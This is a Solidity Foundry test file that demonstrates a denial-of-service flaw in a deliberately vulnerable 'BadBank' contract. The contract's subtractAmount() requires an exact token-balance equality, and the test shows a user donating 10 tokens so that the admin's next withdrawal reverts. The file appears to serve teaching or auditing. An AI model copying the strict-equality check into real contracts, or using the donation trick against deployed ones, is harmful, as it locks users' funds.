
/**
 *  DOS attack to BadBank.subtractAmount(). 
 *   When a malicious user donates some collateral tokens to BadBank, the condition of ollateralToken.balanceOf(address(this)) == totalCollateral - amount) will be broken. 
 */

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TokenA is ERC20{
  constructor() ERC20("TokenA", "AAA"){

  }

  function mint(address account, uint256 amount) public {
    _mint(account, amount);
  }
}

contract TokenB is ERC20{
  constructor() ERC20("TokenB", "BBB"){

  }

  function mint(address account, uint256 amount) public{
    _mint(account, amount);
  }
}


contract BadBank{
    ERC20 collateralToken;
    uint256 public totalCollateral;
    address admin;

    modifier onlyAdmin{
       require(msg.sender == admin, "only admin is allowed.");
       _;
    }
   
    constructor(address _collateralToken, address _admin){
         collateralToken = ERC20(_collateralToken);
         admin = _admin;
         collateralToken.approve(admin, type(uint256).max);
    }

    function addAmount(uint256 amount) onlyAdmin public{
        require(collateralToken.balanceOf(address(this)) >= totalCollateral + amount);

        totalCollateral += amount;
    }

    function subtractAmount(uint256 amount) public onlyAdmin {
        require(collateralToken.balanceOf(address(this)) == totalCollateral - amount);

        totalCollateral -= amount;
    }


}


contract MyTest is Test{
      TokenA tokenA;
      BadBank badBank;
      address admin = address(111);
      address user1 = address(1);
      address user2 = address(2);

  function setUp() public {
      tokenA = new TokenA();
      badBank = new BadBank(address(tokenA), admin);

      tokenA.mint(admin, 10000);

  }

  function testAmount() public{
      vm.startPrank(admin);
      tokenA.transfer(address(badBank), 3000);
      badBank.addAmount(3000);
      vm.stopPrank();

      assertEq(badBank.totalCollateral(), 3000);

      vm.startPrank(admin);
      tokenA.transferFrom(address(badBank), admin, 1500);
      badBank.subtractAmount(1500);
      vm.stopPrank();

      
      assertEq(badBank.totalCollateral(), 1500);

      // a user donate some tokenA to badBank to launch a DOS attack
      tokenA.mint(user1, 10);
      vm.prank(user1);
      tokenA.transfer(address(badBank), 10);

      vm.startPrank(admin);
      tokenA.transferFrom(address(badBank), admin, 500);
      vm.expectRevert();                  // will revert since 
      badBank.subtractAmount(500);
      vm.stopPrank();
  }

}
